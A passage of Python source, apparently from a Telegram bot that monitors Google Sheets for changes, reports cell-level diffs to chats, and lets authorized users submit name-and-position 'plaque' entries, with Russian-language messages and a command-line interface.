    admin_message = "Плашка {}\n{} — {}\nСтрока {} · {}\n{}".format(
        action_text,
        name,
        position,
        result["row"],
        result["worksheet_title"],
        result["url"],
    )
    send_plain_chat_message(args, chat_id, "TS26: готово", public_message, reply_markup=plaque_reply_keyboard())
    for admin_id in admin_chat_ids():
        try:
            send_plain_chat_message(args, admin_id, "TS26: плашка через бота", admin_message)
        except (MonitorError, ConfigError) as exc:
            log("Не удалось уведомить админа о плашке: {}".format(exc))


def handle_plaque_callback(args, sheets, state, callback):
    if args.no_plaque_form:
        return False
    callback_id = callback.get("id")
    message = callback.get("message") or {}
    chat = message.get("chat") or {}
    from_user = callback.get("from") or {}
    chat_id, _user_id = actor_ids(chat, from_user)
    data = callback.get("data") or ""
    if not data.startswith("plq:"):
        return False
    if data == "plq:admin_panel":
        if not is_authorized_actor(chat, from_user, is_admin_chat_id):
            answer_callback(args, callback_id, "Нет доступа")
            return True
        answer_callback(args, callback_id)
        set_user_mode_chat(state, chat_id, False)
        clear_plaque_session(state, chat_id)
        send_debug_menu(args, chat_id, sheets, state)
        return True
    if not is_authorized_actor(chat, from_user, lambda value: can_use_plaque_form(sheets, state, value)):
        answer_callback(args, callback_id, "Нет доступа к форме плашек")
        return True
    answer_callback(args, callback_id, "Записываю..." if data == "plq:confirm" else "Готово")
    if data == "plq:start":
        ask_plaque_name(args, state, chat_id)
    elif data == "plq:confirm":
        try:
            confirm_plaque(args, state, chat_id)
        except (MonitorError, ConfigError) as exc:
            keyboard = plaque_confirm_user_mode_keyboard() if is_user_mode_chat(state, chat_id) else plaque_confirm_keyboard()
            send_plain_chat_message(args, chat_id, "TS26: ошибка записи", str(exc), reply_markup=keyboard)
    elif data == "plq:edit_name":
        plaque_session(state, chat_id).clear()
        ask_plaque_name(args, state, chat_id)
    elif data == "plq:edit_position":
        session = plaque_session(state, chat_id)
        if isinstance(session.get("entries"), list):
            session.clear()
            ask_plaque_name(args, state, chat_id)
        else:
            ask_plaque_position(args, state, chat_id)
    elif data == "plq:cancel":
        clear_plaque_session(state, chat_id)
        send_plain_chat_message(args, chat_id, "TS26: отменено", "Плашка не отправлена в таблицу.", reply_markup=plaque_reply_keyboard())
    return True


def handle_plaque_message(args, sheets, state, message):
    if args.no_plaque_form:
        return False
    chat = message.get("chat") or {}
    from_user = message.get("from") or {}
    chat_id, _user_id = actor_ids(chat, from_user)
    raw_text = (message.get("text") or "").strip()
    text = normalize_space(raw_text)
    if not chat_id or not text:
        return False
    allowed = is_authorized_actor(chat, from_user, lambda value: can_use_plaque_form(sheets, state, value))
    command = text.split()[0].split("@", 1)[0].lower() if text.startswith("/") else ""
    if command == "/start" or text.casefold() == HELP_BUTTON_TEXT.casefold():
        clear_plaque_session(state, chat_id)
        send_start_screen(
            args,
            chat_id,
            state=state,
            is_content_recipient=str(chat_id) in content_plan_chat_ids(state),
            can_use_plaque=allowed,
        )
        return True
    if command:
        if allowed:
            send_plain_chat_message(args, chat_id, "TS26: команда не нужна", "Используйте кнопки внизу чата. Для начала нажмите «Добавить плашку».", reply_markup=plaque_reply_keyboard())
        else:
            send_plain_chat_message(
                args,
                chat_id,
                "TS26: нет доступа",
                "Эта команда недоступна для вашего чата.\nНажмите /start, чтобы посмотреть, что доступно.",
            )
        return True
    if not allowed:
        return False
    session = plaque_sessions(state).get(str(chat_id), {})
    if text.casefold() == PLAQUE_ADD_BUTTON_TEXT.casefold():
        clear_plaque_session(state, chat_id)
        send_plaque_start(args, chat_id, state=state)
        ask_plaque_name(args, state, chat_id)
        return True
    step = session.get("step")
    if step == "name":
        try:
            entries = parse_plaque_batch(raw_text)
            if entries:
                session.clear()
                session["entries"] = entries
                send_plaque_confirmation(args, state, chat_id)
                return True
            session["name"] = validate_person_name(text)
        except ConfigError as exc:
            send_plain_chat_message(args, chat_id, "TS26: проверьте имя", str(exc))
            return True
        ask_plaque_position(args, state, chat_id)
        return True
    if step == "position":
        try:
            session["position"] = validate_position(text)
        except ConfigError as exc:
            send_plain_chat_message(args, chat_id, "TS26: проверьте должность", str(exc))
            return True
        send_plaque_confirmation(args, state, chat_id)
        return True
    if text.startswith("/"):
        send_plaque_start(args, chat_id, state=state)
        return True
    return False


def poll_admin_updates(args, sheets, state):
    if (args.no_admin_buttons and args.no_plaque_form) or args.no_telegram:
        return False
    token = get_required_telegram_token()
    payload = {"timeout": 0, "allowed_updates": json.dumps(["message", "callback_query"])}
    offset = state.get("_telegram_update_offset")
    if offset:
        payload["offset"] = offset
    try:
        data = telegram_request(token, "getUpdates", payload, args.timeout)
    except (MonitorError, ConfigError) as exc:
        if not args.quiet:
            log("Не удалось проверить Telegram-команды: {}".format(exc))
        return False
    changed = False
    for update in data.get("result") or []:
        update_id = update.get("update_id")
        if update_id is not None:
            state["_telegram_update_offset"] = max(int(state.get("_telegram_update_offset") or 0), int(update_id) + 1)
            changed = True
        try:
            if "callback_query" in update:
                callback = update["callback_query"]
                changed = remember_chat(state, callback.get("message", {}).get("chat") or callback.get("from") or {}) or changed
                # Each handler ignores callback data outside its own "dbg:"/"plq:"
                # namespace, so stop as soon as one of them claims the update.
                if handle_admin_callback(args, sheets, state, callback):
                    changed = True
                elif handle_plaque_callback(args, sheets, state, callback):
                    changed = True
            elif "message" in update:
                message = update["message"]
                changed = remember_chat(state, message.get("chat") or {}) or changed
                if handle_admin_message(args, sheets, state, message):
                    changed = True
                elif handle_plaque_message(args, sheets, state, message):
                    changed = True
        except (MonitorError, ConfigError) as exc:
            log("Ошибка обработки Telegram-команды: {}".format(exc))
        except Exception as exc:  # noqa: BLE001 - one bad update must not stop polling
            log("Непредвиденная ошибка обработки Telegram-обновления {}: {!r}".format(update_id, exc))
    return changed


def cell(rows, row_index, col_index):
    if row_index < 0 or row_index >= len(rows):
        return ""
    row = rows[row_index]
    if col_index < 0 or col_index >= len(row):
        return ""
    return normalize_space(row[col_index])


def row_width(rows):
    return max([len(row) for row in rows] or [0])


def useful_cell_count(row):
    return len([item for item in row if normalize_space(item)])


def detect_header_row(rows):
    for index, row in enumerate(rows[:20]):
        normalized = {normalize_header(item) for item in row}
        if normalized.intersection(KEY_COLUMN_CANDIDATES):
            return index
    best_index = 0
    best_score = 0
    for index, row in enumerate(rows[:20]):
        score = useful_cell_count(row)
        if score > best_score:
            best_score = score
            best_index = index
    return best_index


def headers_for(rows, header_index):
    width = row_width(rows)
    return [cell(rows, header_index, col_index) or "Колонка {}".format(col_index + 1) for col_index in range(width)]


def detect_key_column(headers):
    normalized = [normalize_header(item) for item in headers]
    for candidate in KEY_COLUMN_CANDIDATES:
        if candidate in normalized:
            return normalized.index(candidate)
    return 0


def row_identity(rows, headers, row_index, key_col):
    key = cell(rows, row_index, key_col)
    if key:
        return key
    filled = []
    for col_index, header in enumerate(headers):
        value = cell(rows, row_index, col_index)
        if value:
            filled.append("{}: {}".format(header, value))
        if len(filled) >= 2:
            break
    return ", ".join(filled) or "строка {}".format(row_index + 1)


def day_context(rows, row_index):
    for index in range(row_index, -1, -1):
        text = cell(rows, index, 0)
        if re.match(r"^ДЕНЬ\s+\d+\b", text, re.IGNORECASE):
            return text
    return ""


def row_map(rows, header_index, key_col):
    result = {}
    fallback = []
    for row_index in range(header_index + 1, len(rows)):
        row = rows[row_index]
        if not useful_cell_count(row):
            continue
        key = cell(rows, row_index, key_col)
        if key and key not in result:
            result[key] = row_index
        else:
            fallback.append(row_index)
    return result, fallback


def display_value(value):
    text = normalize_space(value)
    return text if text else "пусто"


def human_field_name(header):
    normalized = normalize_header(header)
    return HUMAN_FIELD_NAMES.get(normalized, normalize_space(header) or "значение")


def describe_cell_change(sheet_label, row_name, header, old_value, new_value):
    field = human_field_name(header)
    if normalize_header(header) == "должность":
        return "Изменена должность у {}: было «{}», стало «{}».".format(row_name, display_value(old_value), display_value(new_value))
    return "Изменено поле «{}» у {}: было «{}», стало «{}».".format(field, row_name, display_value(old_value), display_value(new_value))


def describe_grid_change(sheet_label, day_name, row_name, header, old_value, new_value):
    if day_name:
        return "{}: день «{}», строка «{}», колонка «{}» - было «{}», стало «{}».".format(sheet_label, day_name, row_name, header, display_value(old_value), display_value(new_value))
    return "{}: строка «{}», колонка «{}» - было «{}», стало «{}».".format(sheet_label, row_name, header, display_value(old_value), display_value(new_value))


def looks_like_people_table(headers):
    normalized = {normalize_header(item) for item in headers}
    return bool(normalized.intersection({"фио", "ф.и.о.", "имя", "фио спикера", "спикер"}))


def build_change_messages(sheet_label, previous_rows, current_rows, max_messages=MAX_CHANGE_MESSAGES):
    if not previous_rows:
        return []
    previous_header_index = detect_header_row(previous_rows)
    current_header_index = detect_header_row(current_rows)
    previous_headers = headers_for(previous_rows, previous_header_index)
    current_headers = headers_for(current_rows, current_header_index)
    width = max(len(previous_headers), len(current_headers), row_width(previous_rows), row_width(current_rows))
    headers = [(current_headers[col_index] if col_index < len(current_headers) and current_headers[col_index] else "") or (previous_headers[col_index] if col_index < len(previous_headers) else "") or "Колонка {}".format(col_index + 1) for col_index in range(width)]
    key_col = detect_key_column(headers)
    people_table = looks_like_people_table(headers)
    previous_by_key, previous_fallback = row_map(previous_rows, previous_header_index, key_col)
    current_by_key, current_fallback = row_map(current_rows, current_header_index, key_col)
    messages = []

    for key in current_by_key:
        if key not in previous_by_key:
            messages.append("{}: добавлена строка «{}».".format(sheet_label, row_identity(current_rows, headers, current_by_key[key], key_col)))
            continue
        old_index = previous_by_key[key]
        new_index = current_by_key[key]
        row_name = row_identity(current_rows, headers, new_index, key_col)
        day_name = day_context(current_rows, new_index)
        for col_index, header in enumerate(headers):
            old_value = cell(previous_rows, old_index, col_index)
            new_value = cell(current_rows, new_index, col_index)
            if old_value == new_value:
                continue
            if people_table:
                messages.append(describe_cell_change(sheet_label, row_name, header, old_value, new_value))
            else:
                messages.append(describe_grid_change(sheet_label, day_name, row_name, header, old_value, new_value))
            if max_messages is not None and len(messages) >= max_messages:
                return messages

    for key in previous_by_key:
        if key not in current_by_key:
            messages.append("{}: удалена строка «{}».".format(sheet_label, row_identity(previous_rows, headers, previous_by_key[key], key_col)))
            if max_messages is not None and len(messages) >= max_messages:
                return messages

    paired_fallback = min(len(previous_fallback), len(current_fallback))
    for index in range(paired_fallback):
        old_index = previous_fallback[index]
        new_index = current_fallback[index]
        row_name = row_identity(current_rows, headers, new_index, key_col)
        day_name = day_context(current_rows, new_index)
        for col_index, header in enumerate(headers):
            old_value = cell(previous_rows, old_index, col_index)
            new_value = cell(current_rows, new_index, col_index)
            if old_value == new_value:
                continue
            messages.append(describe_grid_change(sheet_label, day_name, row_name, header, old_value, new_value))
            if max_messages is not None and len(messages) >= max_messages:
                return messages

    for row_index in current_fallback[paired_fallback:]:
        messages.append("{}: добавлена строка «{}».".format(sheet_label, row_identity(current_rows, headers, row_index, key_col)))
        if max_messages is not None and len(messages) >= max_messages:
            return messages
    for row_index in previous_fallback[paired_fallback:]:
        messages.append("{}: удалена строка «{}».".format(sheet_label, row_identity(previous_rows, headers, row_index, key_col)))
        if max_messages is not None and len(messages) >= max_messages:
            return messages

    return messages


def build_change_summary(sheet_label, previous, current, full_diff=False):
    previous_rows = previous.get("cells") or []
    current_rows = current.get("cells") or []
    max_messages = None if full_diff else MAX_CHANGE_MESSAGES
    messages = build_change_messages(sheet_label, previous_rows, current_rows, max_messages=max_messages)
    if messages:
        hidden_count = max(0, estimate_changed_cells(previous_rows, current_rows) - len(messages))
        if not full_diff and hidden_count > 0:
            messages.append("Показаны первые {} изменений, еще примерно {} не показано.".format(MAX_CHANGE_MESSAGES, hidden_count))
        return "\n".join(messages)
    old_rows = previous.get("rows")
    row_text = "строк: {} -> {}".format(old_rows, current["rows"]) if old_rows is not None else "строк: {}".format(current["rows"])
    return "{}; размер: {} байт".format(row_text, current["bytes"])


def estimate_changed_cells(previous_rows, current_rows):
    height = max(len(previous_rows), len(current_rows))
    width = max(row_width(previous_rows), row_width(current_rows))
    changed = 0
    for row_index in range(height):
        for col_index in range(width):
            if cell(previous_rows, row_index, col_index) != cell(current_rows, row_index, col_index):
                changed += 1
    return changed


def check_sheet(sheet, state, args):
    key = sheet_key(sheet)
    label = sheet["label"]
    previous = state.get(key, {})
    current = fetch_sheet(sheet["url"], args.timeout, range_name=sheet.get("range", ""))
    current.update({
        "label": label,
        "url": sheet["url"],
        "checked_at": now_text(),
        "error": "",
    })
    if normalize_header(label) == normalize_header("План записи"):
        maybe_send_pending_plate_links(args, sheet, state)

    old_hash = previous.get("hash")
    if old_hash and old_hash != current["hash"]:
        is_content_plan = is_content_plan_sheet(sheet)
        message = build_change_summary(label, previous, current, full_diff=is_content_plan)
        log("Обновление: {} ({})".format(label, message.splitlines()[0] if message else "есть изменения"))
        current["last_change_at"] = current["checked_at"]
        if is_content_plan:
            queue_size = queue_content_plan_change(state, message, captured_at=current["checked_at"])
            log("Изменение Контент-плана добавлено в почасовую очередь: событий {}.".format(queue_size))
        else:
            if normalize_header(label) == normalize_header("План записи"):
                notify_current_day_plate_changes(args, sheet, previous, current, state)
            delivered = notify(args, "TS26: обновилась таблица", message, subtitle=label, url=sheet["url"], sheet=sheet, state=state)
            if delivered:
                current["last_notification_at"] = now_text()
    elif not old_hash:
        log("Первый снимок: {} (строк: {}, {} байт)".format(label, current["rows"], current["bytes"]))
        if args.notify_initial:
            notify(args, "TS26: монитор запущен", "Первый снимок сохранен; строк: {}".format(current["rows"]), subtitle=label, url=sheet["url"], sheet=sheet, state=state)
    elif not args.quiet:
        log("Без изменений: {} (строк: {})".format(label, current["rows"]))

    state[key] = current


def check_all(sheets, state, args):
    changed_state = False
    for sheet in sheets:
        key = sheet_key(sheet)
        previous = state.get(key, {})
        try:
            check_sheet(sheet, state, args)
            changed_state = True
        except MonitorError as exc:
            message = str(exc)
            log("Ошибка: {} - {}".format(sheet["label"], message))
            if previous.get("error") != message:
                notify(args, "TS26: ошибка монитора", message, subtitle=sheet["label"], url=sheet["url"], sheet=sheet, state=state)
            previous.update({
                "label": sheet["label"],
                "url": sheet["url"],
                "checked_at": now_text(),
                "error": message,
            })
            state[key] = previous
            changed_state = True
    return changed_state


def send_startup_message(args, sheets, state=None):
    labels = ", ".join([sheet["label"] for sheet in sheets])
    message = "Бот запущен. Отслеживается таблиц: {}. Интервал проверки: {} сек.".format(len(sheets), args.interval)
    if labels:
        message = "{}\n{}".format(message, labels)
    notify(args, "TS26: монитор активен", message, state=state)


def build_parser():
    parser = argparse.ArgumentParser(
        description="Фоново проверяет Google Sheets и отправляет Telegram-уведомления при изменениях."
    )
    parser.add_argument("--interval", type=int, default=DEFAULT_INTERVAL_SECONDS, help="Интервал проверки в секундах. По умолчанию: %(default)s.")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION_SECONDS, help="Сколько секунд работать и затем выйти. 0 значит без ограничения.")
    parser.add_argument("--timeout", type=int, default=30, help="Таймаут HTTP-запросов в секундах.")
    parser.add_argument("--state", default=str(DEFAULT_STATE_PATH), help="JSON-файл состояния. По умолчанию: %(default)s.")
    parser.add_argument("--sheets", default=str(DEFAULT_SHEETS_PATH), help="JSON-файл со списком таблиц.")
    parser.add_argument("--sheet", action="append", default=[], help='Таблица: "Название=https://docs.google.com/...". Если задано, заменяет sheets.json.')
    parser.add_argument("--env", default=".env", help="Файл с TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID.")
    parser.add_argument("--once", action="store_true", help="Проверить один раз и выйти.")
    parser.add_argument("--notify-initial", action="store_true", default=DEFAULT_NOTIFY_INITIAL, help="Отправить Telegram-сообщение при первом сохранении снимка.")
    parser.add_argument("--startup-message", action="store_true", default=DEFAULT_STARTUP_MESSAGE, help="Отправить Telegram-сообщение при запуске.")
    parser.add_argument("--print-chat-ids", action="store_true", help="Показать chat_id из последних сообщений боту и выйти.")
    parser.add_argument("--no-telegram", action="store_true", help="Не отправлять Telegram-сообщения, только писать лог.")
    parser.add_argument("--no-admin-buttons", action="store_true", default=not DEFAULT_ADMIN_BUTTONS, help="Не читать Telegram-команды и не показывать debug-кнопки.")
    parser.add_argument("--no-plaque-form", action="store_true", default=not DEFAULT_PLAQUE_FORM, help="Отключить форму добавления плашек для обычных пользователей.")
    parser.add_argument("--no-macos-notifications", action="store_true", default=not DEFAULT_MACOS_NOTIFICATIONS, help="Не показывать системные уведомления macOS.")
    parser.add_argument("--no-notifications", action="store_true", help="Не отправлять ни Telegram, ни системные уведомления macOS.")
    parser.add_argument("--quiet", action="store_true", help="Не писать в лог проверки без изменений.")
    return parser


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.interval < 5:
        raise SystemExit("Интервал меньше 5 секунд слишком агрессивен для Google Sheets.")
    if args.duration < 0:
        raise SystemExit("Duration не может быть отрицательным.")
    if args.no_notifications:
        args.no_telegram = True
        args.no_macos_notifications = True
    load_dotenv(args.env)
    if args.print_chat_ids:
        print_chat_ids(args)
        return
    sheets = load_sheets(args)
    if not sheets:
        raise SystemExit("Добавьте хотя бы одну таблицу в sheets.json или через --sheet.")
    state_path = Path(args.state).expanduser()
    state_lock = acquire_state_lock(state_path)
    state = load_state(state_path)

    started_at = time.monotonic()
    duration_text = ", длительность {} сек.".format(args.duration) if args.duration else ""
    log("Старт монитора v{}: {} таблиц, интервал {} сек.{}".format(APP_VERSION, len(sheets), args.interval, duration_text))
    log("Runtime: Python {}, pid {}.".format(sys.version.split()[0], os.getpid()))
    log("Файл состояния: {}".format(state_path))
    log("Основные Telegram chat_id: {}".format(", ".join(default_chat_ids()) or "не заданы"))
    for sheet in sheets:
        log("Получатели для {}: {}".format(sheet["label"], ", ".join(recipient_chat_ids(sheet, state=state)) or "не заданы"))
    configure_bot_commands(args)
    if args.startup_message:
        send_startup_message(args, sheets, state=state)
    def guarded(label, action):
        """Run one loop step; log and continue instead of killing the monitor.

        Everything below runs forever under launchd/Docker. A single bad sheet, an
        expired Google token or a malformed Telegram update previously terminated the
        whole process, which stopped notifications until someone noticed.
        """
        try:
            return action()
        except (MonitorError, ConfigError) as exc:
            log("Шаг '{}' не выполнен: {}".format(label, exc))
        except Exception as exc:  # noqa: BLE001 - keep the monitor alive
            log("Непредвиденная ошибка в шаге '{}': {!r}".format(label, exc))
        return False

    def run_step(label, action):
        if guarded(label, action):
            guarded("save_state", lambda: save_state(state_path, state))

    run_step("poll_admin_updates", lambda: poll_admin_updates(args, sheets, state))
    consecutive_failures = 0
    while True:
        try:
            run_step("flush_content_plan_digest", lambda: flush_content_plan_digest(args, sheets, state))
            run_step("maybe_hourly_ae_ready_sync", lambda: maybe_hourly_ae_ready_sync(args, sheets, state))
            run_step("check_all", lambda: check_all(sheets, state, args))
            consecutive_failures = 0
        except Exception as exc:  # noqa: BLE001 - last-resort guard
            consecutive_failures += 1
            backoff = min(300, 5 * (2 ** min(consecutive_failures, 6)))
            log("Цикл проверки упал ({} подряд): {!r}. Пауза {} сек.".format(consecutive_failures, exc, backoff))
            time.sleep(backoff)
        if args.once:
            break
        next_check_at = time.monotonic() + args.interval
        while True:
            if args.duration and time.monotonic() - started_at >= args.duration:
                log("Монитор завершен по duration: {} сек.".format(args.duration))
                return
            remaining = next_check_at - time.monotonic()
            if remaining <= 0:
                break
            run_step("flush_content_plan_digest", lambda: flush_content_plan_digest(args, sheets, state))
            run_step("maybe_hourly_ae_ready_sync", lambda: maybe_hourly_ae_ready_sync(args, sheets, state))
            run_step("poll_admin_updates", lambda: poll_admin_updates(args, sheets, state))
            time.sleep(min(5, remaining))


if __name__ == "__main__":
    try:
        main()
    except ConfigError as exc:
        raise SystemExit(str(exc))
